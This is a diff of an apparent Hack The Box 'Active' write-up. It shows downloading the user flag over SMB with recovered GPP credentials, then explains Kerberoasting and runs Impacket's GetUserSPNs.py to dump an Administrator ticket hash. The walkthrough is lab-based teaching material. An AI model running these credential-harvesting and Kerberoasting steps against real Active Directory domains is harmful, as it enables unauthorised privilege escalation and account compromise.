@@ -141,16 +141,69 @@
         SYSVOL                                            	READ ONLY	Logon server share 
         Users                                             	READ ONLY	
 
-// $smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 --download 'Users/SVC_TGS/Desktop/user.txt'
-[+] Starting download: Users\SVC_TGS\Desktop\user.txt (34 bytes)
-[+] File output to: /home/r4r3/Desktop/GitHub/HTB/Machines/Windows/Easy/Active/10.10.10.100-Users_SVC_TGS_Desktop_user.txt
-┌─[r4r3@r4r3-80sm]─[~/Desktop/GitHub/HTB/Machines/Windows/Easy/Active]
-└──╼ $ls
- 10.10.10.100-Replication_active.htb_Policies_{31B2F340-016D-11D2-945F-00C04FB984F9}_MACHINE_Preferences_Groups_Groups.xml   10.10.10.100-Users_SVC_TGS_Desktop_user.txt  'Text File.txt'
-┌─[r4r3@r4r3-80sm]─[~/Desktop/GitHub/HTB/Machines/Windows/Easy/Active]
-└──╼ $cat 10.10.10.100-Users_SVC_TGS_Desktop_user.txt 
-86d67d8ba232bb6a254aa4d10159e983
+// And we can get the user flag
+
+    $ smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 --download 'Users/SVC_TGS/Desktop/user.txt'
+------
+
+    [+] Starting download: Users\SVC_TGS\Desktop\user.txt (34 bytes)
+    [+] File output to: /home/r4r3/Desktop/GitHub/HTB/Machines/Windows/Easy/Active/10.10.10.100-Users_SVC_TGS_Desktop_user.txt
+
+    $ cat 10.10.10.100-Users_SVC_TGS_Desktop_user.txt 
+
+    86d67d8..........
+
+### ------Privilleges Escalation------
+
+---Exploit kerberos---
+
+    88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-08-21 01:38:02Z)
+
+//Kerberos is a protocol for authentication used in Windows Active Directory environments.
+
+// In 2014, Tim Medin presented an attack on Kerberos he called Kerberoasting. It’s worth reading through the presentation,
+
+// as Tim uses good graphics to illustrate the process, but I’ll try to give a simple overview.
+
+---------
+// When you want to authenticate to some service using Kerberos, you contact the DC and tell it to which system service you want to authenticate.
+
+// It encrypts a response to you with the service user’s password hash. You send that response to the service,
+
+// which can decrypt it with it’s password, check who you are, and decide it if wants to let you in.
+
+--------
+// In a Kerberoasting attack, rather than sending the encrypted ticket from the DC to the service,
+
+//you will use off-line brute force to crack the password associated with the service.
+
+---------
+// Most of the time you will need an active account on the domain in order to initial Kerberoast,
+
+// but if the DC is configured with UserAccountControl setting “Do not require Kerberos preauthentication” enabled,
+
+// it is possible to request and receive a ticket to crack without a valid account on the domain
+
+---------
+// We can enumerate users with Impacket tool [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)
+
+    $ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -outputfile TGSs.out
+-------
+
+    Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation
+
+    ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+    --------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+    active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2021-01-21 11:07:03.723783             
+// found user Administrator now we can see the output file
+
+    $ cat TGSs.out 
+-----
+
+    $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$0a3618a439425010957d385e56825551$07db537e0cf4aeecfda7d5444ce972b3fec8da305fa9196455a60c11ef07b4ca671eb50cf343d4119aa28cc17f61cc33a714f678e203f1c9bfc38e4c0eaf2d2ebca1ef2e1850d18c9055db304877901796c2f430968a1f5ee2ca624d4d2b4b2ca831258f7289bd1c1a539883d04afcc9327dbae....
 
 
+https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
 
-Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
+// We can see the hash starts with 'krb5tgs'
+
